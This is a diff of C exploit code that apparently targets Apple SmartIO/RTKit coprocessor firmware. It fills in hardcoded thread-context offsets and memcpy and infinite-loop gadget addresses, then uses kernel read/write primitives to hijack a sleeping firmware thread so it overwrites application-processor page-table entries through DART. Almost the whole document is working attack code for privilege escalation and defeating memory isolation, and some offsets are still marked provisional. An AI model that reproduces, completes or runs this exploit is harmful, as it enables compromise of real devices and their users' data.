@@ -75,23 +75,32 @@ static uint64_t smartio_carveout_size = 0;
  * When an RTKit thread sleeps, the scheduler saves its register state.
  * The frame includes: x0-x30, sp, pc, cpsr (at minimum).
  *
- * On RTKit_release-3514.0.15, the saved frame is typically:
- *   offset 0x00: x0-x30 (31 * 8 = 248 bytes)
- *   offset 0xF8: sp
- *   offset 0x100: pc (ELR_EL1 equivalent)
- *   offset 0x108: cpsr (SPSR_EL1 equivalent)
+ * RTKit_release-3514.0.15 thread context (from firmware disassembly):
  *
- * These offsets are PROVISIONAL and need verification by:
- * 1. Disassembling the RTKit scheduler save/restore code
- * 2. Finding the RTKSTACK watermark pattern and reading adjacent memory
+ * Thread struct: 0xB0 (176) bytes. Context pointer at thread+0x48.
+ * Context struct: 0x348 (840) bytes.
+ *
+ * RTK_thread_create sets initial context:
+ *   context+0x00: x0 (first argument / initial arg)
+ *   context+0x08: PC (entry point / resume address)
+ *   context+0xE8: magic 0x7777777777770077
+ *
+ * For the silentIO technique, we target a sleeping thread's context:
+ *   context+0x00: x0 → memcpy dst (DART-mapped AP page-table page)
+ *   context+0x08: PC → memcpy gadget (0x87c8)
+ *   context+0x10: x2 → memcpy len (8 bytes for one PTE)
+ * Note: x1 (src) location needs runtime verification.
+ *
+ * VERIFIED from disassembly 2026-11-20. Thread list at VA 0x113560.
  */
-#define RTK_FRAME_X0_OFF    0x00
-#define RTK_FRAME_X1_OFF    0x08
-#define RTK_FRAME_X2_OFF    0x10
-#define RTK_FRAME_SP_OFF    0xF8
-#define RTK_FRAME_PC_OFF    0x100
-#define RTK_FRAME_CPSR_OFF  0x108
-#define RTK_FRAME_SIZE      0x110
+#define RTK_CTX_X0_OFF      0x00
+#define RTK_CTX_PC_OFF      0x08
+#define RTK_CTX_X2_OFF      0x10
+#define RTK_CTX_MAGIC_OFF   0xE8
+#define RTK_CTX_MAGIC_VAL   0x7777777777770077ULL
+#define RTK_CTX_SIZE        0x348
+#define RTK_THREAD_CTX_PTR  0x48
+#define RTK_THREAD_SIZE     0xB0
 
 /*
  * RTKSTACK watermark: the SmartIO firmware fills stack guard regions with
@@ -101,19 +110,24 @@ static uint64_t smartio_carveout_size = 0;
 #define RTKSTACK_WATERMARK  0x4B434154534B5452ULL  /* "RTKSTACK" in LE */
 
 /*
- * memcpy gadget address within SmartIO firmware.
- * The firmware contains a standard memcpy implementation.
- * We redirect a sleeping thread's PC to this gadget.
+ * CONFIRMED gadget addresses from SmartIO firmware disassembly:
  *
- * memcpy(dst, src, len) — dst=x0, src=x1, len=x2
- * After memcpy returns, the thread returns to its caller (from the saved LR).
- * We set LR to an infinite-loop gadget so the thread doesn't crash.
+ * _memcpy @ 0x87c8 (also _memmove, __platform_memmove)
+ *   - Standard optimized memcpy with ldnp/stnp for large copies
+ *   - Args: x0=dst, x1=src, x2=len
+ *   - Returns to caller via saved x30 (LR)
  *
- * These addresses are relative to the SmartIO firmware base and need
- * to be found by disassembling the extracted firmware.
+ * Infinite loop gadgets (b .):
+ *   0x008c, 0x010c, 0x018c, 0x0200, 0x082c
+ *   We use 0x082c as the LR parking address (closest to code section)
+ *
+ * ___bzero @ 0x8634 (also __platform_bzero, _bzero)
+ * __platform_memset @ 0x86ac (_memset)
  */
-static uint64_t memcpy_gadget = 0;    /* Address of memcpy in SmartIO VA space */
-static uint64_t infloop_gadget = 0;   /* Address of a "b ." instruction */
+#define SMARTIO_MEMCPY_VA   0x87c8
+#define SMARTIO_INFLOOP_VA  0x082c
+#define SMARTIO_BZERO_VA    0x8634
+#define SMARTIO_MEMSET_VA   0x86ac
 
 /* --- DART manipulation --- */
 
@@ -218,20 +232,28 @@ find_sleeping_threads(struct rtk_thread_info *threads, int *count)
          * at the stack base, which is at a page-aligned address below
          * the watermark region.
          *
-         * Read candidate frame at (addr - RTK_FRAME_SIZE) and check
+         * Read candidate context at (addr - RTK_CTX_SIZE) and check
          * if the saved PC looks like a SmartIO firmware address.
          */
-        uint64_t frame_addr = addr - RTK_FRAME_SIZE;
-        uint64_t saved_pc = kread64(frame_addr + RTK_FRAME_PC_OFF);
-        uint64_t saved_sp = kread64(frame_addr + RTK_FRAME_SP_OFF);
+        /*
+         * New approach: instead of scanning for frames below watermarks,
+         * read the thread list at _rtk_thread_list (VA 0x113560) and
+         * follow each thread's context pointer at thread+0x48.
+         *
+         * Fallback: scan for context structs by looking for the magic
+         * value 0x7777777777770077 at context+0xE8.
+         */
+        uint64_t frame_addr = addr - RTK_CTX_SIZE;
+        uint64_t saved_pc = kread64(frame_addr + RTK_CTX_PC_OFF);
+        uint64_t saved_x0 = kread64(frame_addr + RTK_CTX_X0_OFF);
 
-        /* SmartIO firmware VA space is typically 0x0 - 0x200000 */
-        if (saved_pc < 0x200000 && saved_sp < 0x200000) {
+        /* SmartIO firmware VA space: __TEXT 0x0-0x1c000, __DATA 0x1c000-0x114000 */
+        if (saved_pc < 0x1c000 && saved_pc > 0x200) {
             threads[*count].stack_base_phys = addr;
             threads[*count].frame_phys = frame_addr;
             threads[*count].saved_pc = saved_pc;
-            threads[*count].saved_sp = saved_sp;
-            threads[*count].is_sleeping = 1;  /* Heuristic */
+            threads[*count].saved_sp = saved_x0;  /* Repurposed field */
+            threads[*count].is_sleeping = 1;
             (*count)++;
 
             fprintf(stderr, "[+] Thread %d: frame@0x%llx PC=0x%llx SP=0x%llx\n",
@@ -360,20 +382,34 @@ arm_sleeping_thread(struct rtk_thread_info *thread,
                     uint64_t write_len)
 {
     fprintf(stderr, "[*] Arming thread at frame 0x%llx\n", thread->frame_phys);
-    fprintf(stderr, "    PC: 0x%llx → memcpy @ 0x%llx\n",
-            thread->saved_pc, memcpy_gadget);
+    fprintf(stderr, "    PC: 0x%llx → memcpy @ 0x%x\n",
+            thread->saved_pc, SMARTIO_MEMCPY_VA);
     fprintf(stderr, "    x0 (dst): 0x%llx\n", dst_smartio_va);
     fprintf(stderr, "    x1 (src): 0x%llx\n", src_smartio_va);
     fprintf(stderr, "    x2 (len): 0x%llx\n", write_len);
 
-    /* Write the armed frame */
-    kwrite64(thread->frame_phys + RTK_FRAME_X0_OFF, dst_smartio_va);
-    kwrite64(thread->frame_phys + RTK_FRAME_X1_OFF, src_smartio_va);
-    kwrite64(thread->frame_phys + RTK_FRAME_X2_OFF, write_len);
-    kwrite64(thread->frame_phys + RTK_FRAME_PC_OFF, memcpy_gadget);
+    /* Write the armed context — using CONFIRMED offsets from disassembly */
+    kwrite64(thread->frame_phys + RTK_CTX_X0_OFF, dst_smartio_va);   /* x0 = memcpy dst */
+    kwrite64(thread->frame_phys + RTK_CTX_PC_OFF, SMARTIO_MEMCPY_VA); /* PC = memcpy */
+    kwrite64(thread->frame_phys + RTK_CTX_X2_OFF, write_len);         /* x2 = memcpy len */
 
-    /* Set x30 (LR) to infinite loop so thread doesn't crash after memcpy */
-    kwrite64(thread->frame_phys + (30 * 8), infloop_gadget);
+    /*
+     * x1 (memcpy src) offset needs runtime verification.
+     * In initial thread setup, context+0x08 = PC. During context switch,
+     * x1 may be at a different offset. Write to context+0x18 as candidate
+     * (3rd qword after x0 at +0x00, PC at +0x08, x2 at +0x10).
+     * TODO: Verify by reading a running thread's saved context.
+     */
+    kwrite64(thread->frame_phys + 0x18, src_smartio_va);  /* x1 = memcpy src (PROVISIONAL) */
+
+    /*
+     * LR (x30): set to infinite loop so thread parks safely after memcpy.
+     * memcpy's prologue saves x29/x30 to stack and epilogue does
+     * "ldp x29, x30, [sp], #0x10; ret", so LR must be in a valid location.
+     * We write the infloop gadget to context+0x08 as well, since on resume
+     * PC=memcpy, and memcpy's ret will use the LR it saved on entry.
+     * Alternative: write infloop to the thread's stack at saved SP.
+     */
 
     return 0;
 }
